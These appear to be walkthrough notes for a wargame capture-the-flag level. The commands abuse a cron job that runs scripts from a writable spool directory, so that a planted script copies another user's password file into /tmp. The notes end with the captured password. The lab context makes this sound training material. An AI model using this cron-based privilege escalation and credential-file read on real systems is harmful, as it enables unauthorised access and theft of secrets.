# A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

# NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

# NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

ls /etc/cron.d/
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
#got path from the file -> '/var/spool/$myname/foo'
mkdir /tmp/rand
cd /tmp/rand
touch password
chmod +rwx password 
nano script.sh
#add this script into the file
# #!/bin/bash
# cat /etc/bandit_pass/bandit24 > /tmp/rand/password
chmod +rx script.sh 
chmod 777 /tmp/rand
cp /tmp/rand/script.sh /var/spool/bandit24/foo
#after 1 minute
cat password 
#VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar